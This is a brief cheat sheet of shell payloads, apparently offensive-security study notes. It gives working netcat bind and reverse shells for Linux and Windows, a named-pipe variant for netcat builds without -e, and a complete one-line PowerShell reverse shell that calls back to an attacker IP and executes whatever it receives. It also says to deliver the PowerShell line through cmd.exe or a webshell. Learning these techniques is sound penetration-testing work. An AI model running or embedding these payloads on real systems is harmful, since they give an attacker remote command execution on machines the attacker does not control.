### **Summary of Commands for Common Payloads**

---

### **Netcat Bind Shells**
1. **For Linux** (requires the `-e` option in netcat):
   ```bash
   nc -lvnp <PORT> -e /bin/bash
   ```

2. **Without the `-e` Option (Linux):**
   ```bash
   mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
   ```
   - **Explanation**: Creates a named pipe (`/tmp/f`), sends listener input to the pipe, and connects the pipe output to `sh` for execution.

3. **For Windows** (requires `nc.exe` with the `-e` option):
   ```cmd
   nc -lvnp <PORT> -e cmd.exe
   ```

---

### **Netcat Reverse Shells**
1. **For Linux** (with `-e` option):
   ```bash
   nc <LOCAL-IP> <PORT> -e /bin/bash
   ```

2. **Without the `-e` Option (Linux):**
   ```bash
   mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
   ```

3. **For Windows** (requires `nc.exe` with the `-e` option):
   ```cmd
   nc <LOCAL-IP> <PORT> -e cmd.exe
   ```

---

### **Powershell Reverse Shell**
```powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
- Replace `<IP>` and `<PORT>` with the attacker's details.
- Copy and paste into `cmd.exe` or execute via a webshell for a reverse shell.

---

### **General Tips**
- **PayloadsAllTheThings Repository**:  
   A valuable resource for a wide range of shell payloads in multiple languages.  
   Repository link: [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

- **Netcat on Windows**: Use the static binary located in Kali at `/usr/share/windows-resources/binaries/nc.exe`.

- **Firewalls/NAT**: Use reverse shells in environments where outbound connections are allowed. Bind shells require open ports on the target.

- **Alternative Payloads**: If netcat is not available, consider using other tools like Socat, Metasploit (`msfvenom`), or Python-based reverse shells.
